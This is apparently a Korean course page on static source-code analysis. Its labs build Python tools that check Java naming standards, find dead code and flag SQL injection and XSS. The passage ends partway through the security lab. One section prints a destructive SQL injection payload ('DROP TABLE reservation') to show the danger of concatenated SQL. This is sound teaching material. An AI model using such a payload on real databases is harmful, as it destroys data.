+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>메서드를 하나도 못 찾는다</td>
+        <td>정규식의 <code>^\s*</code> 를 확인하십시오. 들여쓰기를 허용해야 합니다</td></tr>
+    <tr><td><code>for</code> 문까지 메서드로 센다</td>
+        <td>예약어 집합에 넣으십시오</td></tr>
+    <tr><td>복잡도가 생각보다 크다</td>
+        <td><code>&amp;&amp;</code> 와 <code>||</code> 도 분기로 세기 때문입니다</td></tr>
+    <tr><td>목표를 몇으로 잡나</td>
+        <td>지금 값보다 낮되 한 번에 닿을 수 있는 선으로 잡으십시오</td></tr>
+    <tr><td>체크리스트가 여덟 줄이나 되나</td>
+        <td>줄여도 됩니다. 1번과 8번은 빼지 마십시오</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>복잡도.py</code>, 돌린 화면,
+     <code>품질목표.md</code>, <code>체크리스트.md</code>(여덟 줄), <code>절차.md</code></p>
+
+  <p><b>스스로 확인</b> —
+     ① 도구가 메서드 여섯을 다 찾았습니까
+     ② process 의 복잡도가 19 로 나왔습니까
+     ③ 목표에 구간 조건을 붙였습니까
+     ④ 절차에서 회귀 시험이 두 번 나옵니까</p>
+</div>
+      </div>
+</div>
+
+<h3 class="lv">레벨 3 · 소스코드 분석 <span>능력단위요소 ② · 세 갈래로 훑습니다</span></h3>
+
+<div class="step" id="st6">
+      <h3><i>6</i>개발 표준을 안 지킨 자리</h3>
+      <aside class="side">
+        <p class="pt">약속을 지켰는지 도구가 봅니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 2-1</p>
+        <b class="sh">용어</b>
+        <p class="v">개발 표준 · 룰 세트</p>
+      </aside>
+      <div class="bd">
+
+<h4>개발 표준이 정하는 것</h4>
+
+<table class="wide">
+  <tr><th style="width:150px">갈래</th><th>자바에서 흔히 쓰는 약속</th></tr>
+  <tr><td>클래스 이름</td><td>파스칼 표기 — <code>ReservationConsole</code></td></tr>
+  <tr><td>메서드 이름</td><td>낙타 표기 — <code>buildSql</code></td></tr>
+  <tr><td>상수 이름</td><td>대문자와 밑줄 — <code>MAX_CAPACITY</code></td></tr>
+  <tr><td>필드 이름</td><td>낙타 표기 — <code>acceptedCount</code></td></tr>
+  <tr><td>들여쓰기</td><td>공백 네 칸. 탭을 섞지 않습니다</td></tr>
+  <tr><td>줄 길이</td><td>100자 안쪽</td></tr>
+  <tr><td>디렉터리 구조</td><td>패키지와 폴더를 맞춥니다</td></tr>
+</table>
+
+<p>약속 자체에 옳고 그름은 없습니다. 팀이 하나로 정하고 그대로 따르는 것이 표준입니다.</p>
+
+<h4>도구가 찾아 줍니다</h4>
+
+<p class="cmdline"><code>&gt; python 표준검사.py before\src
+ReservationConsole.java     7  필드명     LASTERROR     낙타 표기
+ReservationConsole.java     8  상수명     max           대문자와 밑줄
+ReservationConsole.java    84  줄길이     136자          100자 이하
+ReservationConsole.java    95  메서드명    Format_Name   낙타 표기
+ReservationConsole.java    96  탭                     공백 4칸
+지적 5건</code></p>
+
+<p>다섯 줄 가운데 둘이 서로 반대입니다.
+   <code>LASTERROR</code> 는 상수처럼 생겼는데 값이 바뀌는 필드이고,
+   <code>max</code> 는 필드처럼 생겼는데 <code>static final</code> 상수입니다.</p>
+
+<div class="note">이름이 생김새를 배반하면 읽는 사람이 헛짚습니다.
+  대문자 이름을 보면 값이 안 바뀌겠거니 하고 넘어가는데,
+  <code>LASTERROR</code> 는 검사할 때마다 바뀌고 있어서 그 짐작이 어긋납니다.
+  이런 자리는 컴파일도 되고 시험도 통과하기 때문에 도구가 없으면 끝까지 남습니다.
+</div>
+
+<h4>고친 뒤에 다시 돌립니다</h4>
+
+<p class="cmdline"><code>&gt; python 표준검사.py step1\src
+지적 0건
+
+&gt; python 표준검사.py step2\src
+ReservationConsole.java    30  줄길이     101자          100자 이하
+지적 1건</code></p>
+
+<p>구조만 고친 판은 0건인데 보안까지 고친 판에서 한 건이 새로 생겼습니다.
+   메서드 선언에 인자가 넷이라 101자가 되었습니다.
+   고치는 과정에서 새 지적이 생기는 일은 흔하고, 그래서 한 번만 돌리면 안 됩니다.</p>
+
+<h4>결과를 남깁니다</h4>
+
+<p class="cmdline"><code>분석\표준위반.md
+
+| 파일 | 줄 | 갈래 | 지금 | 고칠 이름 | 언제 |
+|------|-----|------|------|-----------|------|
+| ReservationConsole | 7 | 필드명 | LASTERROR | (없앰) | 실습 9 |
+| ReservationConsole | 8 | 상수명 | max | (없앰) | 실습 7 |
+| ReservationConsole | 84 | 줄길이 | 136자 | 세 줄로 나눔 | 실습 9 |
+| ReservationConsole | 95 | 메서드명 | Format_Name | (없앰) | 실습 7 |
+| ReservationConsole | 96 | 탭 | 탭 1개 | 공백 4칸 | 실습 7 |</code></p>
+
+<p>고칠 이름 칸에 「없앰」이 셋입니다. 표준을 안 지킨 자리가 실은 안 쓰는 코드였던 것입니다.</p>
+      <div class="lab">
+  <b class="t">실습 6</b>
+  <b>표준검사.py 를 만들어 돌린다</b>
+
+  <p><b>목적</b> — 이름 짓는 약속을 지켰는지 눈으로 보려면 파일을 처음부터 끝까지 읽어야 합니다.
+     규칙을 코드에 적어 두면 몇 초에 끝나고, 무엇보다 사람마다 다른 판정이 안 나옵니다.</p>
+
+  <h5>절차 1 — 규칙을 코드로 적는다</h5>
+
+  <p class="cmdline"><code>도구\표준검사.py
+
+# -*- coding: utf-8 -*-
+"""개발 표준을 안 지킨 자리를 찾는다."""
+import re, sys
+from pathlib import Path
+
+규칙 = [
+    ("클래스명", re.compile(r"\b(?:class|interface)\s+([A-Za-z_]\w*)"),
+     lambda n: n[0].isupper() and "_" not in n, "파스칼 표기"),
+    ("메서드명", re.compile(r"\b(?:public|private|protected|static|\s)+[\w&lt;&gt;\[\]]+\s+(\w+)\s*\([^)]*\)\s*\{"),
+     lambda n: n[0].islower() and "_" not in n, "낙타 표기"),
+    ("상수명", re.compile(r"\bstatic\s+final\s+[\w&lt;&gt;\[\]]+\s+(\w+)"),
+     lambda n: n.isupper(), "대문자와 밑줄"),
+    ("필드명", re.compile(r"^\s*(?:public|private|protected)?\s*static\s+(?!final)[\w&lt;&gt;\[\]]+\s+(\w+)\s*="),
+     lambda n: n[0].islower() and not n.isupper(), "낙타 표기"),
+]
+예약 = {"if", "for", "while", "switch", "catch", "return", "new", "else", "do", "try"}</code></p>
+
+  <p>규칙 하나가 네 조각입니다. 갈래 이름, 찾는 정규식, 통과인지 보는 함수, 사람에게 보여 줄 설명입니다.
+     이렇게 짜 두면 규칙을 더할 때 줄 하나만 보태면 됩니다.</p>
+
+  <h5>절차 2 — 훑는 부분을 쓴다</h5>
+
+  <p class="cmdline"><code>def 검사(경로):
+    지적 = []
+    for f in sorted(Path(경로).rglob("*.java")):
+        줄 = f.read_text(encoding="utf-8").splitlines()
+        for i, l in enumerate(줄, 1):
+            for 이름, 패턴, 판정, 설명 in 규칙:
+                for m in 패턴.finditer(l):
+                    n = m.group(1)
+                    if n in 예약:
+                        continue
+                    if not 판정(n):
+                        지적.append((f.name, i, 이름, n, 설명))
+            if len(l) &gt; 100:
+                지적.append((f.name, i, "줄길이", f"{len(l)}자", "100자 이하"))
+            if "\t" in l:
+                지적.append((f.name, i, "탭", "", "공백 4칸"))
+    return 지적</code></p>
+
+  <h5>절차 3 — 찍는 부분을 쓴다</h5>
+
+  <p class="cmdline"><code>경로 = sys.argv[1] if len(sys.argv) &gt; 1 else "before/src"
+지적 = 검사(경로)
+print(f"{'파일':&lt;24}{'줄':&gt;5}  {'갈래':&lt;8}{'이름':&lt;14}{'규칙'}")
+print("-" * 74)
+for f, i, k, n, s in 지적:
+    print(f"{f:&lt;24}{i:&gt;5}  {k:&lt;8}{n:&lt;14}{s}")
+print("-" * 74)
+print(f"지적 {len(지적)}건")</code></p>
+
+  <h5>절차 4 — 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 표준검사.py before\src
+파일                          줄  갈래      이름            규칙
+--------------------------------------------------------------------------
+ReservationConsole.java     7  필드명     LASTERROR     낙타 표기
+ReservationConsole.java     8  상수명     max           대문자와 밑줄
+ReservationConsole.java    84  줄길이     136자          100자 이하
+ReservationConsole.java    95  메서드명    Format_Name   낙타 표기
+ReservationConsole.java    96  탭                     공백 4칸
+--------------------------------------------------------------------------
+지적 5건</code></p>
+
+  <p>화면을 <code>화면\01_표준검사_before.png</code> 로 남기십시오.</p>
+
+  <h5>절차 5 — 다섯 줄을 하나씩 열어 본다</h5>
+
+  <table class="wide">
+    <tr><th style="width:130px">지적</th><th style="width:110px">진짜인가</th><th>무엇이 문제인가</th></tr>
+    <tr><td>LASTERROR</td><td>진짜</td>
+        <td>대문자라 안 바뀔 것 같은데 검사할 때마다 값이 들어갑니다</td></tr>
+    <tr><td>max</td><td>진짜</td>
+        <td>안 바뀌는 값인데 소문자라 필드로 보입니다</td></tr>
+    <tr><td>136자</td><td>진짜</td>
+        <td>가로로 스크롤해야 끝이 보입니다</td></tr>
+    <tr><td>Format_Name</td><td>진짜</td>
+        <td>자바에서 안 쓰는 표기라 다른 언어 코드처럼 보입니다</td></tr>
+    <tr><td>탭</td><td>진짜</td>
+        <td>편집기마다 다른 너비로 보여서 줄이 들쭉날쭉합니다</td></tr>
+  </table>
+
+  <p>다섯 다 진짜입니다. 오탐이 나오는 것은 실습 7 부터입니다.</p>
+
+  <h5>절차 6 — 탭이 정말 있는지 확인한다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "(Get-Content before\src\ReservationConsole.java)[95]"
+	 return s.trim().toUpperCase();</code></p>
+
+  <p>화면으로는 공백과 구별이 안 갑니다.
+     그래서 이런 것은 도구가 아니면 못 찾고, 도구가 없으면 파일마다 다른 들여쓰기가 섞여 갑니다.</p>
+
+  <h5>절차 7 — 결과서를 쓴다</h5>
+
+  <p class="cmdline"><code>분석\표준위반.md
+
+| 파일 | 줄 | 갈래 | 지금 | 어떻게 할 것인가 | 실습 |
+|------|-----|------|------|------------------|------|
+| ReservationConsole | 7 | 필드명 | LASTERROR | lastError 로 고침 | 9 |
+| ReservationConsole | 8 | 상수명 | max | 안 쓰므로 지움 | 9 |
+| ReservationConsole | 84 | 줄길이 | 136자 | 세 줄로 나눔 | 9 |
+| ReservationConsole | 95 | 메서드명 | Format_Name | 안 쓰므로 지움 | 9 |
+| ReservationConsole | 96 | 탭 | 탭 1개 | 지우는 줄이라 같이 사라짐 | 9 |</code></p>
+
+  <div class="note">다섯 가운데 셋이 「지움」입니다.
+    표준을 안 지킨 자리가 실은 아무도 안 쓰는 코드였던 것입니다.
+    쓰이지 않는 코드는 아무도 안 읽으니 이름도 안 고쳐지고, 그렇게 남아서 다음 사람을 헷갈리게 합니다.
+  </div>
+
+  <h5>절차 8 — 실습 1 의 표와 견준다</h5>
+
+  <p class="cmdline"><code>| 내가 손으로 찾은 것 | 도구도 찾았나 |
+|---------------------|---------------|
+| (실습 1 에서 적은 것) | 예 / 아니오 |</code></p>
+
+  <p>손으로 찾았는데 도구가 못 찾은 항목이 몇 개인지 세어 보십시오.
+     대개 <code>sql</code> 이나 <code>p</code> 같은 이름이 거기 들어갑니다.
+     표기법은 맞지만 뜻이 안 드러나는 이름이라 규칙으로 잡을 수가 없습니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>지적이 하나도 없다</td>
+        <td>경로를 <code>before\src</code> 로 주었는지 보십시오</td></tr>
+    <tr><td><code>if</code> 나 <code>for</code> 가 메서드로 잡힌다</td>
+        <td>예약어 집합에 넣으십시오</td></tr>
+    <tr><td>탭이 안 잡힌다</td>
+        <td>편집기가 탭을 공백으로 바꿔 저장했습니다</td></tr>
+    <tr><td>줄 길이 기준이 100 이 맞나</td>
+        <td>팀이 정하면 됩니다. 80 이나 120 도 흔합니다</td></tr>
+    <tr><td>내 코드에서 지적이 쏟아진다</td>
+        <td>정상입니다. 한 번에 다 고치지 말고 목록만 만드십시오</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>표준검사.py</code>, 화면 <code>01_표준검사_before.png</code>,
+     다섯 줄을 열어 본 표, 탭 확인 화면, <code>표준위반.md</code>,
+     실습 1 과 견준 표</p>
+
+  <p><b>스스로 확인</b> —
+     ① 규칙을 네 조각으로 나눠 적었습니까
+     ② 지적 5건이 나왔습니까
+     ③ 지적마다 어떻게 할지 적었습니까
+     ④ 손으로 찾았는데 도구가 못 찾은 것을 세었습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st7">
+      <h3><i>7</i>죽은 코드</h3>
+      <aside class="side">
+        <p class="pt">아무도 안 부르는 것을 찾습니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 2-1</p>
+        <b class="sh">용어</b>
+        <p class="v">불필요한 코드 · 닿을 수 없는 코드</p>
+      </aside>
+      <div class="bd">
+
+<h4>두 갈래입니다</h4>
+
+<table class="wide">
+  <tr><th style="width:170px">갈래</th><th>무엇</th></tr>
+  <tr><td>아무도 안 부르는 것</td><td>메서드 · 필드 · import 가 선언만 되어 있습니다</td></tr>
+  <tr><td>닿을 수 없는 것</td><td><code>return</code> 뒤에 남은 줄처럼 실행이 못 가는 자리</td></tr>
+</table>
+
+<h4>자바는 둘째 갈래를 거절합니다</h4>
+
+<p class="cmdline"><code>    return a + b;
+    System.out.println("never");
+
+&gt; javac -encoding utf-8 -proc:none -d classes src\ReservationConsole.java
+src\ReservationConsole.java:102: error: unreachable statement
+        System.out.println("never");
+        ^
+1 error</code></p>
+
+<p>경고로 그치지 않고 오류가 나므로 컴파일 자체가 안 됩니다.
+   그래서 자바 프로그램에 남아 있는 죽은 코드는 대개 첫째 갈래입니다.</p>
+
+<h4>도구를 돌립니다</h4>
+
+<p class="cmdline"><code>&gt; python 죽은코드.py before\src
+ReservationConsole.java    95  안 쓰는 메서드    Format_Name
+ReservationConsole.java    99  안 쓰는 메서드    unused
+ReservationConsole.java     8  안 쓰는 필드     max
+지적 3건</code></p>
+
+<p>셋 다 지우면 되는 것들이고, 실습 6 의 표준 위반 다섯 건 가운데 셋이 여기서 같이 사라집니다.</p>
+
+<h4>구조를 고치면 새 죽은 코드가 생깁니다</h4>
+
+<p>아래는 실습 13 까지 마치고 나서 같은 도구를 돌린 결과입니다.
+   지금은 읽어만 두고, 실제로 돌려 보는 것은 그때 합니다.</p>
+
+<p class="cmdline"><code>&gt; python 죽은코드.py step2\src
+Html.java                  12  닿을 수 없는 줄   .replace("&lt;", "&amp;lt;")
+ReservationConsole.java    32  닿을 수 없는 줄   .bind(member)
+ReservationSql.java        17  안 쓰는 메서드    text
+ReservationSql.java        21  안 쓰는 메서드    values
+ReservationSql.java        26  안 쓰는 메서드    toString
+지적 5건</code></p>
+
+<p>다섯 줄을 하나씩 열어 봐야 합니다.</p>
+
+<table class="wide">
+  <tr><th style="width:190px">지적</th><th style="width:90px">진짜인가</th><th>까닭</th></tr>
+  <tr><td>Html.java:12</td><td>오탐</td>
+      <td>메서드 연결이 여러 줄에 걸쳐 있어 둘째 줄을 오해했습니다</td></tr>
+  <tr><td>ReservationConsole:32</td><td>오탐</td>
+      <td>같은 까닭입니다</td></tr>
+  <tr><td>ReservationSql:17 text</td><td>진짜</td>
+      <td>만들어 놓고 아무 데서도 안 씁니다</td></tr>
+  <tr><td>ReservationSql:21 values</td><td>진짜</td>
+      <td>같습니다</td></tr>
+  <tr><td>ReservationSql:26 toString</td><td>오탐</td>
+      <td>문자열과 이어 붙일 때 자바가 자동으로 부릅니다</td></tr>
+</table>
+
+<div class="warn">셋째와 넷째 줄이 뼈아픈 지적입니다.
+  죽은 코드를 없애려고 리팩토링을 했는데 그 과정에서 죽은 코드를 새로 만들었습니다.
+  나중에 쓸 것 같아서 <code>text()</code> 와 <code>values()</code> 를 미리 만들어 둔 탓입니다.
+  <b>지금 안 쓰는 것은 만들지 않는 편</b>이 낫고, 정말 필요해지면 그때 만들어도 늦지 않습니다.
+</div>
+
+<h4>도구가 왜 헛짚는지 봅니다</h4>
+
+<p class="cmdline"><code>도구는 이렇게 판단합니다
+  return 으로 시작하는 줄을 만나면 그 뒤는 못 온다
+
+그런데 실제 코드는
+  return s.replace("&amp;", "&amp;amp;")
+          .replace("&lt;", "&amp;lt;")      ← 이 줄도 return 문의 일부입니다
+          .replace("&gt;", "&amp;gt;");</code></p>
+
+<p>한 문장이 여러 줄에 걸쳐 있다는 것을 도구가 모릅니다.
+   줄 단위로 훑는 방식의 한계이고, 제대로 하려면 자바 문법을 해석해야 합니다.
+   시중 도구가 비싼 까닭도 대개 이 해석기에 있습니다.</p>
+      <div class="lab">
+  <b class="t">실습 7</b>
+  <b>죽은코드.py 를 만들고 javac 가 무엇을 거절하는지 본다</b>
+
+  <p><b>목적</b> — 아무도 안 부르는 코드는 읽는 사람의 시간을 계속 뺏습니다.
+     지우면 되는 것인데도 「어딘가 쓰이겠지」 싶어 남겨 두는 일이 많아서, 도구로 확인하고 지웁니다.</p>
+
+  <h5>절차 1 — 자바가 무엇을 거절하는지 먼저 본다</h5>
+
+  <p class="cmdline"><code>unused 메서드에 한 줄을 넣어 봅니다
+
+    static int unused(int a, int b) {
+        return a + b;
+        // 아래는 절대 실행되지 않는다
+        System.out.println("never");
+    }
+
+&gt; javac -encoding utf-8 -proc:none -d before\classes before\src\ReservationConsole.java
+before\src\ReservationConsole.java:102: error: unreachable statement
+        System.out.println("never");
+        ^
+1 error</code></p>
+
+  <p>경고가 아니라 오류입니다. 넣은 줄을 지워야 컴파일이 됩니다.</p>
+
+  <div class="note">자바는 닿을 수 없는 문장을 아예 못 쓰게 막습니다.
+    그래서 자바 코드에 남는 죽은 코드는 대부분 「쓸 수는 있는데 아무도 안 부르는 것」 쪽입니다.
+    언어가 막아 주는 갈래와 우리가 찾아야 하는 갈래가 다르다는 것을 알아 두십시오.
+    넣었던 줄은 지우고 다시 컴파일해 두십시오.
+  </div>
+
+  <h5>절차 2 — 안 부르는 메서드를 찾는 부분을 쓴다</h5>
+
+  <p class="cmdline"><code>도구\죽은코드.py
+
+# -*- coding: utf-8 -*-
+"""쓰이지 않는 코드와 닿을 수 없는 코드를 찾는다."""
+import re, sys
+from pathlib import Path
+
+경로 = sys.argv[1] if len(sys.argv) &gt; 1 else "before/src"
+파일 = sorted(Path(경로).rglob("*.java"))
+전체 = {f: f.read_text(encoding="utf-8") for f in 파일}
+지적 = []
+
+메서드 = re.compile(r"\b(?:public|private|protected|static|final|\s)+[\w&lt;&gt;\[\]]+\s+(\w+)\s*\([^)]*\)\s*\{")
+필드 = re.compile(r"^\s*(?:public|private|protected)\s+(?:static\s+)?(?:final\s+)?[\w&lt;&gt;\[\]]+\s+(\w+)\s*[=;]")
+예약 = {"if", "for", "while", "switch", "catch", "main", "return", "new"}
+
+for f, s in 전체.items():
+    줄 = s.splitlines()
+    for i, l in enumerate(줄, 1):
+        for m in 메서드.finditer(l):
+            n = m.group(1)
+            if n in 예약:
+                continue
+            부름 = sum(len(re.findall(r"\b" + n + r"\s*\(", t)) for t in 전체.values())
+            if 부름 &lt;= 1:
+                지적.append((f.name, i, "안 쓰는 메서드", n))</code></p>
+
+  <p>선언한 자리에서도 이름 뒤에 괄호가 붙으므로 한 번은 세어집니다.
+     그래서 <code>부름</code> 이 1 이하면 아무도 안 부르는 것입니다.</p>
+
+  <h5>절차 3 — 필드와 닿을 수 없는 줄도 본다</h5>
+
+  <p class="cmdline"><code>    for i, l in enumerate(줄, 1):
+        m = 필드.match(l)
+        if m:
+            n = m.group(1)
+            쓰임 = sum(len(re.findall(r"\b" + n + r"\b", t)) for t in 전체.values())
+            if 쓰임 &lt;= 1:
+                지적.append((f.name, i, "안 쓰는 필드", n))
+
+    깊이 = 0
+    돌아감 = False
+    for i, l in enumerate(줄, 1):
+        t = l.strip()
+        if 돌아감 and t and not t.startswith("}") and not t.startswith("//"):
+            지적.append((f.name, i, "닿을 수 없는 줄", t[:28]))
+            돌아감 = False
+        if re.match(r"^return\b", t):
+            돌아감 = True
+        if t.startswith("}"):
+            돌아감 = False</code></p>
+
+  <h5>절차 4 — 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 죽은코드.py before\src
+파일                          줄  갈래              이름
+----------------------------------------------------------------------
+ReservationConsole.java    95  안 쓰는 메서드        Format_Name
+ReservationConsole.java    99  안 쓰는 메서드        unused
+ReservationConsole.java     8  안 쓰는 필드         max
+----------------------------------------------------------------------
+지적 3건</code></p>
+
+  <p>화면을 <code>화면\02_죽은코드_before.png</code> 로 남기십시오.</p>
+
+  <h5>절차 5 — 정말 안 쓰이는지 확인한다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "(Select-String before\src\ReservationConsole.java -Pattern 'Format_Name' -SimpleMatch).Count"
+1
+&gt; powershell -c "(Select-String before\src\ReservationConsole.java -Pattern 'max' -SimpleMatch).Count"
+1</code></p>
+
+  <p>둘 다 1 입니다. 선언한 줄 하나뿐이라는 뜻이고, 지워도 아무 데도 안 깨집니다.</p>
+
+  <h5>절차 6 — 지워 보고 컴파일한다</h5>
+
+  <p class="cmdline"><code>세 가지를 지우고
+
+&gt; javac -encoding utf-8 -proc:none -d before\classes before\src\ReservationConsole.java
+(오류 없음)
+
+&gt; java -Dstdout.encoding=utf-8 -cp before\classes ReservationConsole
+(열다섯 줄이 그대로 나옵니다)</code></p>
+
+  <p>확인했으면 <code>git checkout</code> 으로 되돌려 두십시오.
+     실제로 지우는 것은 실습 9 에서 step1a 를 만들 때 합니다.</p>
+
+  <h5>절차 7 — 도구가 못 찾는 갈래를 적어 둔다</h5>
+
+  <p class="cmdline"><code>분석\죽은코드_한계.md
+
+| 도구가 찾는 것 | 도구가 못 찾는 것 |
+|----------------|-------------------|
+| 안 부르는 메서드 | 부르기는 하는데 결과를 안 쓰는 메서드 |
+| 안 쓰는 필드 | 값을 넣기만 하고 읽지 않는 필드 |
+| return 뒤의 줄 | 조건이 늘 거짓이라 안 도는 블록 |
+| 안 쓰는 import | 쓰기는 하는데 필요 없는 import |</code></p>
+
+  <p>오른쪽 칸을 채우려면 코드의 뜻까지 따져야 합니다.
+     실습 3 에서 찾은 정원 검사가 바로 오른쪽 아래 칸에 해당합니다.
+     조건이 늘 거짓이라 그 안쪽은 한 번도 안 돌지만, 우리 도구는 그것을 모릅니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td><code>main</code> 이 안 쓰는 메서드로 잡힌다</td>
+        <td>예약어 집합에 <code>main</code> 을 넣었는지 보십시오</td></tr>
+    <tr><td>닿을 수 없는 줄이 엉뚱하게 잡힌다</td>
+        <td>여러 줄에 걸친 <code>return</code> 문입니다. 실습 15 에서 다룹니다</td></tr>
+    <tr><td>지웠더니 컴파일이 안 된다</td>
+        <td>어디선가 쓰고 있는 것입니다. 되돌리고 다시 세어 보십시오</td></tr>
+    <tr><td><code>unreachable statement</code> 를 못 만든다</td>
+        <td><code>return</code> 바로 다음 줄에 문장을 넣어야 합니다</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>unreachable statement</code> 오류 화면,
+     <code>죽은코드.py</code>, 화면 <code>02_죽은코드_before.png</code>,
+     세어 본 화면, 지우고 컴파일한 화면, <code>죽은코드_한계.md</code></p>
+
+  <p><b>스스로 확인</b> —
+     ① 자바가 닿을 수 없는 문장을 거절하는 것을 봤습니까
+     ② 지적 3건이 나왔습니까
+     ③ 정말 안 쓰이는지 따로 세어 봤습니까
+     ④ 도구가 못 찾는 갈래를 적었습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st8">
+      <h3><i>8</i>보안 약점</h3>
+      <aside class="side">
+        <p class="pt">입력이 명령이 되는 자리를 찾습니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 2-1 · 3-1</p>
+        <b class="sh">용어</b>
+        <p class="v">SQL 삽입 · 크로스 사이트 스크립트</p>
+      </aside>
+      <div class="bd">
+
+<h4>보안 약점 진단이 보는 것</h4>
+
+<table class="wide">
+  <tr><th style="width:190px">약점</th><th>무엇이 일어나나</th></tr>
+  <tr><td>SQL 삽입</td><td>입력한 글자가 SQL 명령의 일부가 됩니다</td></tr>
+  <tr><td>크로스 사이트 스크립트</td><td>입력한 글자가 화면에서 스크립트로 실행됩니다</td></tr>
+  <tr><td>오류 정보 노출</td><td>스택 추적이 사용자에게 보입니다</td></tr>
+  <tr><td>하드코딩된 비밀번호</td><td>소스에 적힌 비밀번호가 저장소에 남습니다</td></tr>
+</table>
+
+<h4>도구를 돌립니다</h4>
+
+<p class="cmdline"><code>&gt; python 보안약점.py before\src
+ReservationConsole.java    77  SQL 삽입   문자열을 이어 붙여 SQL 을 만듭니다
+ReservationConsole.java    78  SQL 삽입   값을 따옴표 사이에 끼워 넣습니다
+ReservationConsole.java    82  XSS       입력을 HTML 에 그대로 붙입니다
+ReservationConsole.java    84  XSS       입력을 HTML 에 그대로 붙입니다
+ReservationConsole.java    87  XSS       입력을 HTML 에 그대로 붙입니다
+지적 5건</code></p>
+
+<h4>도구가 못 짚은 줄이 있습니다</h4>
+
+<p class="cmdline"><code>83  System.out.println("&lt;div&gt;신청자 : " + member + "&lt;/div&gt;");
+
+이 줄이 목록에 없습니다</code></p>
+
+<div class="warn">여든세 번째 줄이 다섯 줄 가운데 어느 것보다 위험합니다.
+  <code>member</code> 는 사용자가 친 값 그대로이고, 82번과 87번에 찍히는 <code>msg</code> 는 우리가 만든 문장입니다.
+  도구가 못 짚은 까닭은 정규식이 태그로 끝나는 문자열만 찾는데
+  이 줄은 안내 글귀까지 붙은 채로 끝나기 때문입니다.
+  <b>못 찾은 것은 목록에 안 나오므로 없는 것처럼 보입니다.</b>
+</div>
+
+<h4>실제로 무슨 일이 일어나는지 봅니다</h4>
+
+<p class="cmdline"><code>회원 번호 자리에 넣은 값
+  M0005'; DROP TABLE reservation; --
+
+만들어진 SQL
+  INSERT INTO reservation VALUES ('M0005'; DROP TABLE reservation; --', 'F01', '2026-10-03 11:00')
+
+작은따옴표가 닫히고 세미콜론 뒤로 새 명령이 붙었습니다
+두 줄표 뒤는 주석이라 남은 부분은 무시됩니다</code></p>
+
+<p>이 줄이 실제 데이터베이스로 갔다면 예약 표가 통째로 지워집니다.
+   그런데도 프로그램은 아무 오류를 내지 않고 「예약되었습니다」를 찍습니다.
+   결함을 찾는 눈으로 화면만 보고 있으면 이 일은 끝까지 안 보입니다.</p>
+
+<h4>분석 결과서를 씁니다</h4>
+
+<p class="cmdline"><code>분석\보안약점.md
+
+| 줄 | 약점 | 도구가 찾았나 | 위험도 | 고칠 실습 |
+|-----|------|---------------|--------|-----------|
+| 77 | SQL 삽입 | 예 | 상 | 12 |
+| 78 | SQL 삽입 | 예 | 상 | 12 |
+| 82 | XSS | 예 | 중 | 13 |
+| 83 | XSS | 아니오 | 상 | 13 |
+| 84 | XSS | 예 | 상 | 13 |
+| 87 | XSS | 예 | 하 | 13 |</code></p>
+
+<p>「도구가 찾았나」 칸을 따로 두는 것이 요령입니다.
+   도구만 믿으면 83번 줄이 목록에 아예 안 들어가고, 안 들어간 줄은 고쳐지지 않습니다.</p>
+      <div class="lab">
+  <b class="t">실습 8</b>
+  <b>보안약점.py 를 만들고 못 찾은 줄을 찾아낸다</b>
+
+  <p><b>목적</b> — 도구가 내놓은 목록을 그대로 옮겨 적는 것은 분석이 아닙니다.
+     목록에 든 줄을 하나씩 열어 보고, 목록에 없는 줄도 따로 훑어야 합니다.
+     이번 실습에서 우리 도구는 가장 위험한 줄을 놓칩니다.</p>
+
+  <h5>절차 1 — 찾을 갈래를 정한다</h5>
+
+  <p class="cmdline"><code>도구\보안약점.py
+
+# -*- coding: utf-8 -*-
+"""소스에서 보안 약점 세 갈래를 찾는다."""
+import re, sys
+from pathlib import Path
+
+규칙 = [
+    ("SQL 삽입", re.compile(r'"\s*(?:SELECT|INSERT|UPDATE|DELETE)[^"]*"\s*\+'),
+     "문자열을 이어 붙여 SQL 을 만듭니다"),
+    ("SQL 삽입", re.compile(r"\+\s*\w+\s*\+\s*\"'"),
+     "값을 따옴표 사이에 끼워 넣습니다"),
+    ("XSS", re.compile(r'"&lt;[a-z]+[^"]*&gt;"\s*\+\s*\w+'),
+     "입력을 HTML 에 그대로 붙입니다"),
+    ("오류 정보 노출", re.compile(r"printStackTrace\(\)"),
+     "스택 추적을 화면에 냅니다"),
+    ("하드코딩", re.compile(r'(?:password|passwd|pwd|secret)\s*=\s*"'),
+     "비밀번호를 소스에 적었습니다"),
+]</code></p>
+
+  <h5>절차 2 — 훑고 찍는다</h5>
+
+  <p class="cmdline"><code>경로 = sys.argv[1] if len(sys.argv) &gt; 1 else "before/src"
+지적 = []
+for f in sorted(Path(경로).rglob("*.java")):
+    for i, l in enumerate(f.read_text(encoding="utf-8").splitlines(), 1):
+        for 이름, 패턴, 설명 in 규칙:
+            if 패턴.search(l):
+                지적.append((f.name, i, 이름, 설명, l.strip()[:44]))
+                break
+
+print(f"{'파일':&lt;24}{'줄':&gt;5}  {'약점':&lt;12}{'무엇이':&lt;26}{'코드'}")
+print("-" * 104)
+for f, i, k, s, c in 지적:
+    print(f"{f:&lt;24}{i:&gt;5}  {k:&lt;12}{s:&lt;26}{c}")
+print("-" * 104)
+print(f"지적 {len(지적)}건")</code></p>
+
+  <h5>절차 3 — 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 보안약점.py before\src
+파일                          줄  약점          무엇이                       코드
+--------------------------------------------------------------------------------------
